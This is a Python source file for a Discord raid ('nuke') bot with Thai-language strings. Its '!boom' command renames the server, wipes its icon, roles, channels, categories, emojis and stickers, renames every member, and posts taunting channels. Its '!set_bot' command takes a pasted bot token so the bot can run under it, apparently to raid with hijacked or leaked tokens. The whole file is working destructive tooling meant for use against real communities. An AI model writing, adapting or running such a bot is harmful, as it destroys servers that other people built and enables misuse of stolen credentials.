import discord
from discord.ext import commands
import asyncio

intents = discord.Intents.default()
intents.members = True
bot = commands.Bot(command_prefix="!", intents=intents)

admin_id = 1127935823195668480  # Replace with the admin's Discord ID
bot_token = None

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')

@bot.command(name="set_bot")
@commands.has_permissions(administrator=True)
async def set_bot(ctx):
    embed = discord.Embed(title="Set Bot Token", description="ใส่โทเค่นเพื่อเซ็ตบอทยิงดิส คำสั่งนี้ใช้ได้เเค่แอดมินเเต่กดปุ่มได้ทุกคน", color=0x00ff00)
    button = discord.ui.Button(style=discord.ButtonStyle.primary, label="ใส่โทเค่น")

    async def button_callback(interaction):  
        if interaction.user.id == admin_id:  
            global bot_token  
            bot_token = await bot.wait_for('message', check=lambda m: m.author == interaction.user)  
            await interaction.response.send_message(f"Bot token set successfully! Bot will be online for 5 minutes.")  
            await bot.start(bot_token.content)  
            await asyncio.sleep(300)  
            await bot.close()  
        else:  
            await interaction.response.send_message("คุณไม่ใช่แอดมิน คุณไม่สามารถเซ็ตโทเค่นได้")  

    button.callback = button_callback  
    view = discord.ui.View()  
    view.add_item(button)  
    await ctx.send(embed=embed, view=view)

@bot.command(name="boom")
@commands.has_guild_permissions(administrator=True)
async def boom(ctx):
    if ctx.author.id == admin_id:
        # Change server name
        await ctx.guild.edit(name="vdena")

        # Delete server icon
        await ctx.guild.edit(icon=None)

        # Delete all roles
        for role in ctx.guild.roles:
            try:
                await role.delete()
            except:
                pass

        # Create new role "vdena"
        await ctx.guild.create_role(name="vdena")

        # Change all members' nicknames to "vdena"
        for member in ctx.guild.members:
            try:
                await member.edit(nick="vdena")
            except:
                pass

        # Delete all channels and categories
        for channel in ctx.guild.channels:
            await channel.delete()

        for category in ctx.guild.categories:
            await category.delete()

        # Create new channels with specified names
        channel_names = [
            "โดนดับเหรอ 🍅",
            "vdenaมาลั่น 🥡",
            "อย่าให้พวกกูขำ 🌻",
            "บอทมึงเซ็ตโง่มาก 🍲",
            "นี่ดิสดีละหรอ 💣",
            "อย่าหลอน 📁",
            "เเค้นเข้ามา 🕸️",
            "ดิสกระจอก 🍃"
        ]
        for name in channel_names:
            await ctx.guild.create_text_channel(name=name)

        # Delete all emojis and stickers
        for emoji in ctx.guild.emojis:
            await emoji.delete()

        for sticker in ctx.guild.stickers:
            await sticker.delete()

        await ctx.send("Server has been 'vdena'ed successfully!")
    else:
        await ctx.send("คุณไม่ใช่แอดมิน คุณไม่สามารถใช้คำสั่งนี้ได้")

# Run the bot
bot.run("YOUR_BOT_TOKEN")
